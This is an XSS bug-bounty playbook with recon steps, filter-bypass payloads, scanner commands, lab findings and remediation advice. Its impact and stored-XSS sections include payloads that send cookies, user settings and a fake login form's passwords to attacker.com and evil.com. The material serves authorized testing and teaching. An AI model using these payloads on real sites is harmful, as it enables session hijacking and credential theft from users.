# XSS (Cross-Site Scripting) Playbook

**Category:** Injection / Client-Side
**Typical Severity:** Medium–High (Critical with strong impact chain)
**CVSS Range:** 4.3–8.8
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

---

## Overview

XSS allows attackers to inject malicious scripts into web pages viewed by other users. In modern bug bounty programs, bare `alert(1)` proofs rarely earn bounties — impact demonstration is critical. The three types:

1. **Reflected XSS**: Payload in request, reflected in response (requires phishing)
2. **Stored XSS**: Payload persisted in database, executed for all visitors
3. **DOM XSS**: Payload processed by client-side JavaScript without going to the server

Modern apps with CSP may limit impact, but XSS in admin panels, payment flows, or on API subdomains can be Critical.

---

## Real-World Impact

- **Session hijacking**: `document.cookie` theft → account takeover
- **Credential harvest**: Inject fake login forms into the DOM
- **Keylogging**: Capture every keystroke in payment forms
- **SameSite bypass via same-site XSS**: Leverage trusted origin to bypass CORS and SameSite=Lax cookies
- **CSRF via XSS**: Bypass anti-CSRF tokens since XSS runs on the same origin
- **BeEF/malware delivery**: Turn victim browser into attack platform
- **Admin panel XSS → RCE**: Admin panels sometimes render user data that can execute commands

---

## Recon Methodology

### Step 1 — Find reflection points

```bash
# Every input that appears in the response is a candidate
# Focus areas:
# - Search boxes: ?q=, ?search=, ?query=
# - URL path parameters: /profile/username
# - HTTP headers reflected: User-Agent, Referer, X-Forwarded-For
# - Error messages that include user input
# - File upload names reflected in the UI
# - Comment/review fields (stored XSS)
# - Profile fields: name, bio, address (stored XSS)
# - API responses rendered in the frontend (DOM XSS)

# Test with a unique marker first (not <script>)
curl "https://target.com/search?q=xss_test_marker_12345"
# Check if xss_test_marker_12345 appears in the response
```

### Step 2 — Identify the context

```bash
# Where is the reflection occurring?
# 1. HTML content: <div>REFLECTION</div>
# 2. HTML attribute: <input value="REFLECTION">
# 3. JavaScript string: var x = "REFLECTION";
# 4. JavaScript URL: href="javascript:REFLECTION"
# 5. HTML comment: <!-- REFLECTION -->
# 6. CSS: style="color: REFLECTION"
# 7. JSON response rendered by JS: {"name": "REFLECTION"}

# Context determines the required payload
```

### Step 3 — Test CSP

```bash
# Check Content-Security-Policy header
curl -si "https://target.com" | grep -i "content-security-policy"

# Weak CSP indicators:
# - 'unsafe-inline' present → script injection directly works
# - Missing → no CSP at all → full XSS
# - 'nonce-' only → might be bypassable
# - Wildcard sources: *.googleapis.com, cdn.jsdelivr.net → JSONP bypass
```

---

## Testing Methodology

### Test 1 — Basic Reflection Test

```bash
# Step 1: Confirm reflection with benign marker
curl "https://target.com/search?q=TESTMARKER12345" | grep "TESTMARKER12345"

# Step 2: Test HTML context breakout
curl "https://target.com/search?q=<b>bold</b>" | grep -i "<b>"

# Step 3: Test script injection
curl "https://target.com/search?q=<script>alert(1)</script>"
```

### Test 2 — Attribute Context Bypass

```html
<!-- If reflected inside an attribute: <input value="REFLECTION"> -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><img src=x onerror=alert(1)>
";<script>alert(1)</script>
```

### Test 3 — JavaScript String Context

```javascript
// If reflected inside a JS string: var x = "REFLECTION";
";alert(1);//
\";alert(1);//
</script><script>alert(1)</script>
```

### Test 4 — DOM XSS

```bash
# Look for these JS sink patterns in source code:
# document.write(location.hash)
# innerHTML = location.search
# eval(data.userInput)
# setTimeout(userString)
# location.href = userInput
# jQuery .html(), .append() with user data

# Test DOM sources:
# - URL fragment (#)
# - Query parameters (window.location.search)
# - document.referrer
# - window.name
# - postMessage data

# DOM XSS payload (via hash)
https://target.com/page#<img src=x onerror=alert(1)>
```

### Test 5 — Stored XSS Locations

```bash
# Profile fields
PUT /api/v1/user/profile
{"displayName": "<script>alert(document.cookie)</script>", "bio": "..."}

# Product reviews (Juice Shop pattern)
PUT /api/v1/products/1/reviews
{"message": "<iframe src=javascript:alert(1)>", "author": "attacker"}

# Comments / feedback
POST /api/feedback
{"comment": "<img src=x onerror='fetch(\"https://evil.com?\"+document.cookie)'>"}
```

### Test 6 — Filter Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>

<!-- Tag alternatives when <script> blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Encoding bypasses -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Protocol-based -->
<a href="javascript:alert(1)">click</a>
<a href="data:text/html,<script>alert(1)</script>">click</a>
```

---

## Common Endpoints to Test

| Location | XSS Type | Impact |
|---|---|---|
| Search/filter parameters | Reflected | Medium (requires phishing) |
| User profile fields | Stored | High (all profile viewers) |
| Product reviews/comments | Stored | High (all product viewers) |
| Admin panel → user list | Stored | Critical (admin execution) |
| Error messages | Reflected | Medium |
| File upload filenames | Stored | High |
| HTTP headers in logs | Stored (if logged) | High |
| Support/feedback forms | Stored | High (support staff) |
| URL fragment (DOM) | DOM | Medium |
| `postMessage` listeners | DOM | Varies |

---

## Impact Payload Examples

### Cookie Theft

```javascript
// Simple exfil
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// Fetch-based (avoids page navigation)
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>
```

### Credential Harvesting (Stored XSS in admin panel)

```javascript
// Inject a fake login form
<script>
document.body.innerHTML += '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h2>Session expired. Please log in again.</h2><form onsubmit="fetch(\'https://evil.com/?\'+btoa(this.username.value+\':\'+this.password.value));return false"><input name=username placeholder=Email><input name=password type=password placeholder=Password><button>Login</button></form></div>';
</script>
```

### SameSite + CORS Bypass via XSS (Compound Chain)

```javascript
// XSS on target.com → use same-origin to call API → bypass SameSite cookies + CORS
<script>
fetch('/api/v1/user/settings', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/collect', {method:'POST', body:JSON.stringify(d)}));
</script>
```

---

## Automation Ideas

```bash
# dalfox — fast XSS scanner
dalfox url "https://target.com/search?q=test" --silence

# kxss — find reflected parameters
echo "https://target.com" | waybackurls | kxss

# XSStrike
python3 XSStrike.py -u "https://target.com/search?q=test" --crawl

# DOM XSS scanning with DOM Invader (Burp extension)
# Load in browser, browse normally, DOM Invader tracks sinks

# nuclei XSS templates
nuclei -u https://target.com -t xss/ -H "Cookie: session=<token>"
```

---

## Real Bug Bounty Examples

### Example 1 — Stored XSS → Admin Takeover ($7,500)
Stored XSS in a support ticket subject line. When support staff viewed the ticket, the payload executed in their admin browser context — cookie theft + account takeover.

### Example 2 — XSS via File Upload Filename ($3,000)
SVG file upload with inline `<script>` tag. When the file was displayed in the browser, the script executed. Target accepted SVG files without stripping inline JS.

### Example 3 — DOM XSS via postMessage ($5,000)
A wildcard `addEventListener('message', ...)` with `innerHTML = event.data` allowed cross-origin page to send XSS payload via `postMessage`.

---

## Lab / Program Examples

### OWASP Juice Shop — Lab Mission 2026-03-12-001 and 2026-03-12-002

**Source:** RedTeam mission artifact `~/RedTeam/missions/juiceshop/`
**Severity:** HIGH (CVSS 8.2)

**Finding — Stored XSS via Product Review API:**
```
PUT /api/v1/products/1/reviews
{"message": "<iframe src=javascript:alert(document.cookie)>", "author": "attacker"}
```
The review was stored and displayed to all users viewing the product page. No CSP in place on the product review rendering context.

**Impact chain:** Stored XSS on a product page → executed in every shopper's browser → session cookie exfiltration possible → account takeover at scale.

**Evidence:** `~/RedTeam/missions/juiceshop/2026-03-12-002/exploit/` (EXP-04)

---

### DVWA — Lab Mission 2026-03-13-001

**Source:** RedTeam mission artifact `~/RedTeam/missions/dvwa/2026-03-13-001/`
**Severity:** HIGH

**Finding — Reflected XSS:**
`/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>` reflected without sanitization. Confirmed session cookie exposure. Used as component in a multi-vector attack chain.

**Evidence:** `~/RedTeam/missions/dvwa/2026-03-13-001/exploit/`

---

## Remediation

```javascript
// Output encoding (OWASP recommendation)
// HTML context
element.textContent = userInput;  // safe
element.innerHTML = escapeHTML(userInput);  // if HTML needed

// JavaScript context — never trust user input in JS strings
// Use JSON.stringify() when embedding data in JS

// CSP header (defense in depth)
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none';
```

```python
# Input sanitization (Python — bleach library)
import bleach
clean = bleach.clean(user_input, tags=['b', 'i', 'u'], attributes={}, strip=True)

# Django — auto-escapes in templates
{{ user_input }}  # safe — auto-escaped
{{ user_input|safe }}  # UNSAFE — marks as safe, don't use with untrusted input
```
